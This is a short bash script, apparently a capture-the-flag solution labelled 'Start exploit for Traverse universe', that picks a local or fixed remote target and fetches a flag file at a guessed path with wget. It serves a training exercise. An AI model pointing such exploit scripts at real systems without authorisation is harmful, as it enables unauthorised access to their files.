#!/bin/bash
PORT=30022

if [[ $1 == "local" ]]; then
  url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]; then
  url='http://141.85.224.101:'$PORT
else
  url=$1':'$2
fi

# Traverse universe
echo "Start exploit for Traverse universe"
wget "$url/earth/moon/NASA/flag.php"
echo "----------------------------"
